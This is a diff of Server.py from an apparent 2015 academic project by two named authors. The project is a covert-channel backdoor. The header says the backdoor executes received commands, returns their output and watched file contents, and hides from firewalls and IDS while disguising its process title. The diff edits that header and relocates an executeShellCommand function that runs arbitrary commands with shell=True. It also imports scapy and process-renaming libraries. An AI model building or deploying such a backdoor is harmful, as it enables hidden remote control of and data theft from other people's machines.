@@ -1,43 +1,27 @@
 ##################################################################################
-##  SOURCE FILE:    AesEncryption.py
+##  SOURCE FILE:    Server.py
 ##
 ##  AUTHOR:         Geoff Dabu
+##					Ben Kim
 ##
 ##  PROGRAM:        Backdoor program which receives commands, executes them and
-##                  returns the output to the client. The process title is also
-##                  changed to disguise itself.
+##                  returns the output to the client. Also it returns contents of 
+##					modified file that a client specified. The communication between
+##					client and itself should not be noticible in its firewall or IDS.
+##					Another words, the application is using a covert channel.
+##					The process title is also changed to disguise itself.
 ##
 ##  FUNCTIONS:      executeShellCommand(string)
 ##					parsePacket(packet)
 ##                  main()
 ##
-##  DATE:           October 17, 2015
+##  DATE:           November 17, 2015
 ##
 ##################################################################################
 import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle, threading, pyinotify, string
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from AesEncryption import *
-
-
-##################################################################################
-##  FUNCTION
-##
-##  Name:           executeShellCommand
-##  Parameters:     string - a shell command
-##  Return Values:  string - the output of the shell command
-##  Description:    executes a shell command and returns the output
-##################################################################################
-def executeShellCommand(command):
-
-    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
-    return outputString
-
-
-def get_filename(path):
-    i = path.rfind('/')
-    return path[i+1:]
 
 
 wm = pyinotify.WatchManager()
@@ -90,6 +74,19 @@ def watch_file(directory, receivedPacket):
     notifier.loop()
 
 
+##################################################################################
+##  FUNCTION
+##
+##  Name:           executeShellCommand
+##  Parameters:     string - a shell command
+##  Return Values:  string - the output of the shell command
+##  Description:    executes a shell command and returns the output
+##################################################################################
+def executeShellCommand(command):
+
+    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
+    return outputString
 
 
 ##################################################################################
